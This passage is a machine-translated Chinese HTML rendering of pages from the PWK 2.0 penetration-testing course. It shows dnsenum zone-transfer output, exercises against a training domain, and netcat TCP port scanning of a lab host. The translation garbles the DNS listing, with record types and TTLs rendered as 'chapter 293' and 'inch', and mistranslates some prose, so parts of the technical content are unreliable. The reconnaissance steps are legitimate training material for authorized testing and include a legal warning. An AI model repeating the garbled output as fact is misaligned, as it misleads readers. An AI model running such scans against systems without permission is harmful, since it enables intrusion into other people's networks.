<div style="position:absolute;top:212749;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:212749;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">179</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_____________</font></font></nobr></div>
<div style="position:absolute;top:211801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns12.zoneedit.com    </font></font></nobr></div>
<div style="position:absolute;top:211801;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第3653章    </font></font></nobr></div>
<div style="position:absolute;top:211801;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">209.62.64.46</font></font></nobr></div>
<div style="position:absolute;top:211818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns16.zoneedit.com    </font></font></nobr></div>
<div style="position:absolute;top:211818;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6975在一个    </font></font></nobr></div>
<div style="position:absolute;top:211818;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69.64.68.41</font></font></nobr></div>
<div style="position:absolute;top:211869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮件 (MX) 服务器：</font></font></nobr></div>
<div style="position:absolute;top:211886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_____</font></font></nobr></div>
<div style="position:absolute;top:211920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASPMX5.GOOGLEMAIL.COM    </font></font></nobr></div>
<div style="position:absolute;top:211920;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:211920;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.69.26</font></font></nobr></div>
<div style="position:absolute;top:211937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASPMX.L.GOOGLE.COM    </font></font></nobr></div>
<div style="position:absolute;top:211937;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:211937;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.74.26</font></font></nobr></div>
<div style="position:absolute;top:211954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ALT1.ASPMX.L.GOOGLE.COM    </font></font></nobr></div>
<div style="position:absolute;top:211954;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:211954;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.66.26</font></font></nobr></div>
<div style="position:absolute;top:211971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ALT2.ASPMX.L.GOOGLE.COM    </font></font></nobr></div>
<div style="position:absolute;top:211971;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:211971;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.65.26</font></font></nobr></div>
<div style="position:absolute;top:211988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASPMX2.GOOGLEMAIL.COM    </font></font></nobr></div>
<div style="position:absolute;top:211988;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:211988;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.78.26</font></font></nobr></div>
<div style="position:absolute;top:212005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASPMX3.GOOGLEMAIL.COM    </font></font></nobr></div>
<div style="position:absolute;top:212005;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:212005;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.65.26</font></font></nobr></div>
<div style="position:absolute;top:212022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASPMX4.GOOGLEMAIL.COM    </font></font></nobr></div>
<div style="position:absolute;top:212022;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第293章    </font></font></nobr></div>
<div style="position:absolute;top:212022;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.194.70.26</font></font></nobr></div>
<div style="position:absolute;top:212073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试区域传输并获取绑定版本：</font></font></nobr></div>
<div style="position:absolute;top:212090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_______________________________________</font></font></nobr></div>
<div style="position:absolute;top:212141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试在 ns12.zoneedit.com 上为 zonetransfer.me 进行区域转移...</font></font></nobr></div>
<div style="position:absolute;top:212158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212158;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 在 SOA</font></font></nobr></div>
<div style="position:absolute;top:212175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212175;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸 NS</font></font></nobr></div>
<div style="position:absolute;top:212192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:212209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">office.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212209;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸    </font></font></nobr></div>
<div style="position:absolute;top:212209;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.23.39.254</font></font></nobr></div>
<div style="position:absolute;top:212226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">owa.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212226;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸    </font></font></nobr></div>
<div style="position:absolute;top:212226;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">207.46.197.32</font></font></nobr></div>
<div style="position:absolute;top:212243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">info.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212243;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 文本格式</font></font></nobr></div>
<div style="position:absolute;top:212260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">asfdbbox.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212260;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸    </font></font></nobr></div>
<div style="position:absolute;top:212260;left:643"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1</font></font></nobr></div>
<div style="position:absolute;top:212277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">canberra_office.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212277;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸    </font></font></nobr></div>
<div style="position:absolute;top:212277;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">202.14.81.230</font></font></nobr></div>
<div style="position:absolute;top:212293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">asfdbvolume.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212293;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AFSDB 中的 7800</font></font></nobr></div>
<div style="position:absolute;top:212310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">email.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212310;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2222章</font></font></nobr></div>
<div style="position:absolute;top:212328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dzc.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212328;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 文本格式</font></font></nobr></div>
<div style="position:absolute;top:212345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">robinwood.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212345;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">302 文本</font></font></nobr></div>
<div style="position:absolute;top:212362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vpn.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212362;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4000 英寸    </font></font></nobr></div>
<div style="position:absolute;top:212362;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">174.36.59.154</font></font></nobr></div>
<div style="position:absolute;top:212378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_sip._tcp.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212378;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14000 英寸 SRV</font></font></nobr></div>
<div style="position:absolute;top:212395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dc_office.zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:212395;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸    </font></font></nobr></div>
<div style="position:absolute;top:212395;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143.228.181.132</font></font></nobr></div>
<div style="position:absolute;top:212429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns16.zoneedit.com 绑定版本：8.4.X</font></font></nobr></div>
<div style="position:absolute;top:212463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定蛮力文件，海湾。</font></font></nobr></div>
<div style="position:absolute;top:212483;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 226 - 使用 dnsenum 执行区域传输。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:212512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些枚举工具功能强大且简单明了。</font><font style="vertical-align: inherit;">花一些时间练习</font></font></nobr></div>
<div style="position:absolute;top:212531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:212566;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.6.3 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:212596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 找到 megacorpone.com 域的 DNS 服务器。</font></font></nobr></div>
<div style="position:absolute;top:212624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 编写一个小脚本，尝试使用更高级别的从 megacorpone.com 进行区域传输</font></font></nobr></div>
<div style="position:absolute;top:212644;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本语言，如 Python、Perl 或 Ruby。</font></font></nobr></div>
<div style="position:absolute;top:212672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 重新创建上面的示例并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsrecon</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试从</font></font></nobr></div>
<div style="position:absolute;top:212691;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:212827;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="180"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 180 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:212860;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:213937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:213937;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:213937;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">180</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:212956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2 端口扫描</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:212997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描是有意检查远程机器上的 TCP 或 UDP 端口的过程</font></font></nobr></div>
<div style="position:absolute;top:213017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测目标上正在运行哪些服务以及可能存在哪些潜在的攻击媒介。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213079;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意端口扫描并不代表传统的用户活动</font></font></i></nobr></div>
<div style="position:absolute;top:213098;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且在某些司法管辖区可能被视为非法。</font><font style="vertical-align: inherit;">因此，不应该</font></font></i></nobr></div>
<div style="position:absolute;top:213117;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经目标直接书面许可，在实验室外进行</font></font></i></nobr></div>
<div style="position:absolute;top:213137;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络所有者。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:213199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解端口扫描的含义以及特定端口扫描的影响至关重要</font></font></nobr></div>
<div style="position:absolute;top:213218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描可以有。</font><font style="vertical-align: inherit;">由于某些扫描可能产生的流量以及它们的</font></font></nobr></div>
<div style="position:absolute;top:213238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侵入性，盲目运行端口扫描会对目标系统或客户端产生不利影响</font></font></nobr></div>
<div style="position:absolute;top:213257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络，例如服务器和网络链接过载或触发 IDS。</font><font style="vertical-align: inherit;">运行错误的扫描</font></font></nobr></div>
<div style="position:absolute;top:213276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会导致客户停机。</font></font></nobr></div>
<div style="position:absolute;top:213309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用适当的端口扫描方法可以显着提高我们的渗透效率</font></font></nobr></div>
<div style="position:absolute;top:213328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试人员，同时也限制了许多风险。</font><font style="vertical-align: inherit;">取决于参与的范围，而不是</font></font></nobr></div>
<div style="position:absolute;top:213348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对目标网络运行全端口扫描，我们可以从只扫描端口 80 开始</font></font></nobr></div>
<div style="position:absolute;top:213367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 443. 有了可能的 Web 服务器列表，我们可以对这些服务器运行完整的端口扫描</font></font></nobr></div>
<div style="position:absolute;top:213386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行其他枚举时的背景。</font><font style="vertical-align: inherit;">一旦全端口扫描完成，我们就可以</font></font></nobr></div>
<div style="position:absolute;top:213406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步缩小我们的扫描范围，以便在每次后续扫描中探查越来越多的信息。</font><font style="vertical-align: inherit;">港口</font></font></nobr></div>
<div style="position:absolute;top:213425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描应被视为一个动态过程，对每个参与来说都是独一无二的。</font><font style="vertical-align: inherit;">结果</font></font></nobr></div>
<div style="position:absolute;top:213444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一次扫描确定下一次扫描的类型和范围。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213479;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.1 TCP/UDP 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:213517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将通过使用 Netcat 的简单 TCP 和 UDP 端口扫描开始对端口扫描的探索。</font><font style="vertical-align: inherit;">它</font></font></nobr></div>
<div style="position:absolute;top:213536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该注意的是，Netcat 不是端口扫描器，但它可以以基本的方式使用。</font></font></nobr></div>
<div style="position:absolute;top:213556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于它已经存在于许多系统中，我们可以重新利用它的一些功能来模仿</font></font></nobr></div>
<div style="position:absolute;top:213575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们不需要功能齐全的端口扫描器时，可以进行基本端口扫描。</font><font style="vertical-align: inherit;">然而，还有远</font></font></nobr></div>
<div style="position:absolute;top:213594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专门用于端口扫描的更好的工具，我们也将详细探讨。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213629;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.1.1 TCP 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:213663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最简单的 TCP 端口扫描技术，通常称为 CONNECT 扫描，依赖于三</font></font></nobr></div>
<div style="position:absolute;top:213682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方式 TCP 握手</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">195</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机制。</font><font style="vertical-align: inherit;">这种机制的设计是为了让两台主机试图</font></font></nobr></div>
<div style="position:absolute;top:213702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通信之前可以协商网络TCP套接字连接的参数</font></font></nobr></div>
<div style="position:absolute;top:213721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输任何数据。</font><font style="vertical-align: inherit;">在基本术语中，主机向</font><font style="vertical-align: inherit;">目标服务器</font><font style="vertical-align: inherit;">发送 TCP </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYN</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包</font></font></nobr></div>
<div style="position:absolute;top:213741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口。</font><font style="vertical-align: inherit;">如果目标端口是开放的，服务器用一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYN-ACK</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包</font><font style="vertical-align: inherit;">响应，</font><font style="vertical-align: inherit;">客户端主机</font></font></nobr></div>
<div style="position:absolute;top:213760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACK</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包以完成握手。</font></font></nobr></div>
<div style="position:absolute;top:213793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果握手成功完成，则认为该端口是开放的。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:213887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">195 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2010 年），http://support.microsoft.com/kb/172983</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:214015;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="181"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 181 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:214048;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:215125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:215125;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:215125;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">181</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了说明这一点，我们将在端口 3388-3390 上运行 TCP Netcat 端口扫描。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项指定</font></font></nobr></div>
<div style="position:absolute;top:214163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以秒为单位的连接超时和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-z</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于指定零 I/O 模式，这将不发送数据</font></font></nobr></div>
<div style="position:absolute;top:214183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并用于扫描：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:214217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nvv -w 1 -z 10.11.1.220 3388-3390</font></font></font></b></nobr></div>
<div style="position:absolute;top:214234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.1.220] 3390 (?) : 连接被拒绝</font></font></nobr></div>
<div style="position:absolute;top:214252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.1.220] 3389 (?) 打开</font></font></nobr></div>
<div style="position:absolute;top:214268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.1.220] 3388 (?) : 连接被拒绝</font></font></nobr></div>
<div style="position:absolute;top:214285;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送 0，接收 0</font></font></nobr></div>
<div style="position:absolute;top:214305;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 227 - 使用 nc 执行 TCP 端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据这个输出，我们可以看到端口 3389 是打开的，而端口 3388 和 3390 上的连接</font></font></nobr></div>
<div style="position:absolute;top:214353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间到。</font><font style="vertical-align: inherit;">下面的屏幕截图显示了这次扫描的 Wireshark 捕获：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:214553;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 42：Wireshark 捕获的 Netcat 端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此捕获（图 42）中，Netcat 将几个 TCP SYN 数据包发送到端口 3390、3389 和 3388</font></font></nobr></div>
<div style="position:absolute;top:214603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别是第 1、5 和 9 行。</font><font style="vertical-align: inherit;">由于多种因素，包括时间问题，数据包可能</font></font></nobr></div>
<div style="position:absolute;top:214622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Wireshark 中出现乱序。</font><font style="vertical-align: inherit;">请注意，服务器</font><font style="vertical-align: inherit;">从端口 3389</font><font style="vertical-align: inherit;">发送了一个 TCP </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYN-ACK</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包</font></font></nobr></div>
<div style="position:absolute;top:214642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 行，表示端口是开放的。</font><font style="vertical-align: inherit;">其他端口没有回复类似的 SYN-ACK</font></font></nobr></div>
<div style="position:absolute;top:214661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包，所以我们可以推断它们没有打开。</font><font style="vertical-align: inherit;">最后在第 8 行，Netcat 关闭了这个连接</font></font></nobr></div>
<div style="position:absolute;top:214680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过发送</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FIN-ACK</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:214714;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.1.2 UDP 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 UDP 是无状态的，不涉及三向握手，UDP 背后的机制</font></font></nobr></div>
<div style="position:absolute;top:214768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描与 TCP 不同。</font></font></nobr></div>
<div style="position:absolute;top:214801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们针对不同目标上的端口 160-162 运行 UDP Netcat 端口扫描。</font><font style="vertical-align: inherit;">这是使用</font></font></nobr></div>
<div style="position:absolute;top:214821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只有</font><font style="vertical-align: inherit;">我们还没有看到的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它表示 UDP 扫描：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
